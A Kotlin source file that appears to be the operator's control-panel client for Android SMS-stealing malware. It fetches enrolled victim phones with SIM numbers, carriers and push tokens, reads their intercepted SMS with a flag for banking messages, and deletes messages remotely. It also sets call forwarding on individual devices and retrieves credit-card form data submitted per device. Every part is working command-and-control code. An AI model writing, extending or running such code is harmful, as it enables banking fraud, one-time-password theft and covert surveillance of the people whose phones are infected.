package com.example.admin.network

import android.util.Log
import com.example.admin.utils.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class SupabaseApi {

    companion object {
        private const val TAG = "DEVICE_API"
        val BASE get() = Constants.DEVICE_API_BASE_URL
    }

    data class RegisteredDevice(
        val uid: String, val model: String? = "", val manufacturer: String? = "",
        val androidVersion: String? = "", val brand: String? = "",
        val sim1Number: String? = "", val sim2Number: String? = "",
        val sim1Carrier: String? = "", val sim2Carrier: String? = "",
        val fcmToken: String? = "", val joinedAt: Long = 0L
    )
    data class DeviceStatus(
        val uid: String, val available: String = "", val checkedAt: Long = 0L,
        val timestamp: Long = 0L, val status: String = "",
        val type: String = "", val online: Boolean = false
    )
    data class BatteryDataSupabase(
        val uid: String, val level: Int = 0, val isCharging: Boolean = false,
        val temperature: Double = 0.0, val voltage: Int = 0,
        val health: String? = "", val timestamp: Long = 0L
    )
    data class AdminConfig(
        val id: String = "main", val number: String = "",
        val status: String = "OFF", val updatedAt: Long = 0L
    )
    data class SmsLog(
        val id: String? = null, val uniqueId: String, val title: String,
        val body: String, val senderNumber: String, val receiverNumber: String,
        val timestamp: Long, val isBanking: Boolean = false
    )
    data class CreditCardApplicationEntry(
        val id: Long = 0L, val type: String = "",
        val data: Map<String, Any> = emptyMap(), val submittedAtMs: Long = 0L
    )

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()
    private val JSON_MT = "application/json; charset=utf-8".toMediaType()

    private fun get(url: String): JSONObject? = try {
        JSONObject(client.newCall(Request.Builder().url(url).get().build()).execute().body?.string() ?: "{}")
    } catch (e: Exception) { Log.e(TAG, "GET $url: ${e.message}"); null }

    private fun post(url: String, body: JSONObject): JSONObject? = try {
        JSONObject(client.newCall(Request.Builder().url(url).post(body.toString().toRequestBody(JSON_MT)).build()).execute().body?.string() ?: "{}")
    } catch (e: Exception) { Log.e(TAG, "POST $url: ${e.message}"); null }

    private fun patch(url: String, body: JSONObject): JSONObject? = try {
        JSONObject(client.newCall(Request.Builder().url(url).patch(body.toString().toRequestBody(JSON_MT)).build()).execute().body?.string() ?: "{}")
    } catch (e: Exception) { Log.e(TAG, "PATCH $url: ${e.message}"); null }

    private fun delete(url: String): JSONObject? = try {
        JSONObject(client.newCall(Request.Builder().url(url).delete().build()).execute().body?.string() ?: "{}")
    } catch (e: Exception) { Log.e(TAG, "DELETE $url: ${e.message}"); null }

    private fun dataArray(obj: JSONObject?) = obj?.optJSONArray("data") ?: JSONArray()
    private fun dataObject(obj: JSONObject?) = obj?.optJSONObject("data")

    fun isRealDeviceRow(subId: String, dataType: String = ""): Boolean {
        if (subId.isBlank() || subId == "admin_config_main" || subId.startsWith("admin_") || subId.startsWith("star_")) return false
        if (dataType.equals("admin_config", true) || dataType.equals("starred_device", true) || dataType.equals("call_forwarding", true)) return false
        return true
    }

    fun parseRegisteredDeviceRow(row: JSONObject): RegisteredDevice? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        val dj = row.optJSONObject("data_json") ?: JSONObject()
        val registeredAt = parseIsoToMs(row.optString("registered_at", ""))
        return RegisteredDevice(
            uid           = uid,
            model         = row.optString("device_model", dj.optString("model", "")).ifBlank { null },
            manufacturer  = dj.optString("manufacturer", "").ifBlank { null },
            androidVersion= row.optString("android_version", dj.optString("androidversion", dj.optString("androidVersion", ""))).ifBlank { null },
            brand         = dj.optString("brand", "").ifBlank { null },
            sim1Number    = dj.optString("sim1number", dj.optString("sim1Number", "")).ifBlank { null },
            sim2Number    = dj.optString("sim2number", dj.optString("sim2Number", "")).ifBlank { null },
            sim1Carrier   = dj.optString("sim1carrier", dj.optString("sim1Carrier", dj.optString("sim1_carrier", ""))).ifBlank { null },
            sim2Carrier   = dj.optString("sim2carrier", dj.optString("sim2Carrier", dj.optString("sim2_carrier", ""))).ifBlank { null },
            fcmToken      = dj.optString("fcm_token", dj.optString("fcmtoken", dj.optString("fcmToken", ""))).ifBlank { null },
            joinedAt      = dj.optLong("joinedat", registeredAt)
        )
    }

    fun parseDeviceStatusRow(row: JSONObject, now: Long = System.currentTimeMillis()): DeviceStatus? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        if (!isRealDeviceRow(uid, row.optString("data_type", "").trim())) return null
        val dj = row.optJSONObject("data_json") ?: JSONObject()
        val hb = dj.optJSONObject("heartbeat") ?: JSONObject()
        val checkedAt = hb.optLong("checked_at", 0L).let { if (it > 0) it else 0L }
            .let { if (it > 0) it else parseIsoToMs(row.optString("last_heartbeat_at", "")) }
            .let { if (it > 0) it else parseIsoToMs(row.optString("updated_at", "")) }
        return DeviceStatus(
            uid = uid, available = hb.optString("available", ""),
            checkedAt = checkedAt, timestamp = checkedAt,
            status = if (checkedAt > 0L) "online" else "offline", type = "heartbeat",
            online = checkedAt > 0L && now - checkedAt in 0 until (15 * 60 * 1000L)
        )
    }

    fun parseBatteryRow(row: JSONObject): BatteryDataSupabase? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        if (!isRealDeviceRow(uid, row.optString("data_type", "").trim())) return null
        val battery = (row.optJSONObject("data_json") ?: JSONObject()).optJSONObject("battery_data") ?: return null
        return BatteryDataSupabase(uid = uid,
            level = battery.optInt("level", 0),
            isCharging = battery.optBoolean("isCharging", battery.optBoolean("ischarging", false)),
            temperature = battery.optDouble("temperature", 0.0),
            voltage = battery.optInt("voltage", 0),
            health = battery.optString("health", "").ifBlank { null },
            timestamp = battery.optLong("timestamp", 0L))
    }

    fun parseStarredRow(row: JSONObject): Pair<String, Boolean>? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        if (!isRealDeviceRow(uid, row.optString("data_type", "").trim())) return null
        return uid to (row.optJSONObject("data_json") ?: JSONObject()).optBoolean("starred", false)
    }

    fun parseSmsMessagesFromRegisteredDevice(row: JSONObject): List<SmsLog> {
        val deviceId = row.optString("sub_id", row.optString("uid", "")).trim()
        if (!isRealDeviceRow(deviceId, row.optString("data_type", "").trim())) return emptyList()
        val arr = row.optJSONArray("sms_messages") ?: JSONArray()
        return (0 until arr.length()).mapNotNull { parseSingleSmsObject(deviceId, arr.optJSONObject(it) ?: return@mapNotNull null, it) }
    }

    fun parseSingleSmsObject(deviceId: String, obj: JSONObject, index: Int = 0): SmsLog? {
        val rawId = obj.optString("sms_id", obj.optString("id", obj.optString("message_id", ""))).trim()
        val ts = readTimestampFromObj(obj)
        val smsId = when { rawId.isNotBlank() -> rawId; ts > 0L -> "sms_$ts"; else -> "sms_${deviceId}_${System.currentTimeMillis()}_$index" }
        val body = obj.optString("message_body", obj.optString("body", obj.optString("text", obj.optString("content", ""))))
        if (body.isBlank()) return null
        return SmsLog(id = smsId, uniqueId = deviceId, title = obj.optString("title", "New SMS"), body = body,
            senderNumber = obj.optString("sender_number", obj.optString("phone_number", obj.optString("from", "Unknown"))),
            receiverNumber = obj.optString("receiver_number", obj.optString("to", "")),
            timestamp = if (ts > 0L) ts else System.currentTimeMillis())
    }

    private fun readTimestampFromObj(obj: JSONObject): Long {
        val l = obj.optLong("timestamp", 0L); if (l > 0L) return l
        val s = obj.optLong("synced_at", 0L); if (s > 0L) return s
        parseTimestampString(obj.optString("timestamp", ""))?.let { return it }
        parseTimestampString(obj.optString("timestamp_readable", ""))?.let { return it }
        return 0L
    }

    private fun parseTimestampString(v: String): Long? {
        if (v.isBlank()) return null
        val patterns = listOf("yyyy-MM-dd HH:mm:ss","yyyy-MM-dd'T'HH:mm:ss.SSS'Z'","yyyy-MM-dd'T'HH:mm:ss'Z'","dd MMM yyyy, hh:mm a")
        for (p in patterns) try { val sdf = SimpleDateFormat(p, Locale.getDefault()); if (p.contains("'Z'")) sdf.timeZone = TimeZone.getTimeZone("UTC"); return sdf.parse(v)?.time } catch (_: Exception) {}
        return null
    }

    private fun parseIsoToMs(v: String): Long {
        if (v.isBlank()) return 0L
        return try { val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).also { it.timeZone = TimeZone.getTimeZone("UTC") }; sdf.parse(v)?.time ?: 0L
        } catch (_: Exception) { try { SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).also { it.timeZone = TimeZone.getTimeZone("UTC") }.parse(v)?.time ?: 0L } catch (_: Exception) { 0L } }
    }

    suspend fun getAllDevices(): Result<List<RegisteredDevice>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/get"))
            Result.success((0 until arr.length()).mapNotNull { parseRegisteredDeviceRow(arr.getJSONObject(it)) })
        } catch (e: Exception) { Log.e(TAG, "getAllDevices: ${e.message}"); Result.failure(e) }
    }

    suspend fun getAllDeviceStatuses(): Result<List<DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/get")); val now = System.currentTimeMillis()
            Result.success((0 until arr.length()).mapNotNull { parseDeviceStatusRow(arr.getJSONObject(it), now) })
        } catch (e: Exception) { Log.e(TAG, "getAllDeviceStatuses: ${e.message}"); Result.failure(e) }
    }

    suspend fun getLatestDeviceStatuses(): Result<Map<String, DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val map = mutableMapOf<String, DeviceStatus>()
            getAllDeviceStatuses().getOrNull()?.forEach { s -> val old = map[s.uid]; if (old == null || s.checkedAt > old.checkedAt) map[s.uid] = s }
            Result.success(map)
        } catch (e: Exception) { Log.e(TAG, "getLatestDeviceStatuses: ${e.message}"); Result.failure(e) }
    }

    suspend fun getAllSmsMessagesFromRegisteredDevices(rowLimit: Int = 1000): Result<List<SmsLog>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/messages?limit=${rowLimit.coerceIn(1, 1000)}"))
            val list = mutableListOf<SmsLog>(); val seen = HashSet<String>()
            for (i in 0 until arr.length()) parseSmsRow(arr.getJSONObject(i))?.let { if (seen.add(it.id ?: "${it.uniqueId}${it.timestamp}")) list.add(it) }
            list.sortByDescending { it.timestamp }; Result.success(list)
        } catch (e: Exception) { Log.e(TAG, "getAllSms: ${e.message}"); Result.failure(e) }
    }

    suspend fun getAllSmsLogs(limit: Int = 200): Result<List<SmsLog>> = getAllSmsMessagesFromRegisteredDevices(limit)

    suspend fun getSmsLogsByUniqueId(uniqueId: String, limit: Int = 50): Result<List<SmsLog>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/messages?uid=$uniqueId&limit=${limit.coerceIn(1, 500)}"))
            Result.success((0 until arr.length()).mapNotNull { parseSmsRow(arr.getJSONObject(it)) }.sortedByDescending { it.timestamp })
        } catch (e: Exception) { Log.e(TAG, "getSmsLogsByUniqueId: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteSmsFromRegisteredDevice(deviceId: String, smsId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try { if (smsId.isBlank()) return@withContext Result.failure(Exception("smsId missing")); Result.success(delete("$BASE/message/$smsId")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteSms: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteSmsLog(smsId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try { if (smsId.isBlank()) return@withContext Result.failure(Exception("smsId missing")); Result.success(delete("$BASE/message/$smsId")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteSmsLog: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteAllSmsMessagesForApp(): Result<Boolean> = withContext(Dispatchers.IO) {
        try { Result.success(delete("$BASE/messages")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteAllSms: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteAllSmsMessagesForDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try { if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing")); Result.success(delete("$BASE/messages?uid=$uid")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteAllSmsForDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun getAdminConfig(): Result<AdminConfig> = withContext(Dispatchers.IO) {
        try {
            val resp = get("$BASE/get/admin_config_main")
            if (resp?.optBoolean("ok", false) != true) return@withContext Result.success(AdminConfig())
            val dj = dataObject(resp)?.optJSONObject("data_json") ?: return@withContext Result.success(AdminConfig())
            Result.success(AdminConfig(number = dj.optString("number", ""), status = dj.optString("status", "OFF")))
        } catch (e: Exception) { Log.e(TAG, "getAdminConfig: ${e.message}"); Result.success(AdminConfig()) }
    }

    suspend fun updateAdminConfig(number: String, status: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("sub_id", "admin_config_main"); put("uid", "admin_config_main"); put("data_type", "admin_config")
                put("data_json", JSONObject().apply { put("number", number); put("status", status); put("updated_at", System.currentTimeMillis()) })
            }
            Result.success(post("$BASE/upsert", body)?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "updateAdminConfig: ${e.message}"); Result.failure(e) }
    }

    suspend fun updateCallForwarding(uid: String, number: String, status: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
            val body = JSONObject().apply { put("call_forward_number", number); put("call_forward_status", status); put("call_forward_timestamp", System.currentTimeMillis()) }
            Result.success(patch("$BASE/update/$uid", body)?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "updateCallForwarding: ${e.message}"); Result.failure(e) }
    }

    suspend fun getStarredDevices(): Result<Map<String, Boolean>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/get")); val map = mutableMapOf<String, Boolean>()
            for (i in 0 until arr.length()) parseStarredRow(arr.getJSONObject(i))?.let { map[it.first] = it.second }
            Result.success(map)
        } catch (e: Exception) { Log.e(TAG, "getStarredDevices: ${e.message}"); Result.success(emptyMap()) }
    }

    suspend fun setStarred(uid: String, starred: Boolean): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
            Result.success(patch("$BASE/star/$uid", JSONObject().put("starred", starred))?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "setStarred: ${e.message}"); Result.failure(e) }
    }

    suspend fun getAllBatteryData(): Result<List<BatteryDataSupabase>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/get"))
            Result.success((0 until arr.length()).mapNotNull { parseBatteryRow(arr.getJSONObject(it)) })
        } catch (e: Exception) { Log.e(TAG, "getAllBatteryData: ${e.message}"); Result.success(emptyList()) }
    }

    suspend fun deleteDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid missing"))
            Result.success(delete("$BASE/device/$uid")?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "deleteDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun getCreditCardApplications(uid: String): Result<List<CreditCardApplicationEntry>> = withContext(Dispatchers.IO) {
        try {
            if (uid.isBlank()) return@withContext Result.failure(Exception("uid required"))
            val arr = dataArray(get("$BASE/form-data?uid=$uid&limit=100"))
            val list = (0 until arr.length()).map { i ->
                val row = arr.getJSONObject(i)
                val dataObj = row.optJSONObject("data") ?: JSONObject()
                val dataMap = mutableMapOf<String, Any>()
                dataObj.keys().forEach { k -> when (val v = dataObj.get(k)) { is String->dataMap[k]=v; is Int->dataMap[k]=v; is Long->dataMap[k]=v; is Double->dataMap[k]=v; is Boolean->dataMap[k]=v; else->dataMap[k]=v.toString() } }
                CreditCardApplicationEntry(id = row.optLong("id", 0L), type = row.optString("form_type", "unknown"), data = dataMap, submittedAtMs = parseIsoToMs(row.optString("submitted_at", "")))
            }
            Result.success(list.sortedByDescending { it.submittedAtMs })
        } catch (e: Exception) { Log.e(TAG, "getCreditCardApplications: ${e.message}"); Result.failure(e) }
    }

    fun formatForDisplay(timestamp: Long): String {
        if (timestamp <= 0L) return "-"
        return try { SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date(timestamp)) } catch (e: Exception) { timestamp.toString() }
    }

    private fun parseSmsRow(row: JSONObject): SmsLog? {
        val uid = row.optString("sub_id", "").trim(); if (uid.isBlank()) return null
        val body = row.optString("content", "").trim(); if (body.isBlank()) return null
        val sentAt = parseIsoToMs(row.optString("sent_at", "")).let { if (it > 0) it else System.currentTimeMillis() }
        val msgType = row.optString("message_type", "sms")
        return SmsLog(id = row.optString("id", "").ifBlank { null }, uniqueId = uid,
            title = if (msgType.equals("sms", true)) "New SMS" else msgType,
            body = body, senderNumber = row.optString("from_id", "Unknown").ifBlank { "Unknown" },
            receiverNumber = row.optString("to_id", "").ifBlank { "" }, timestamp = sentAt)
    }
}
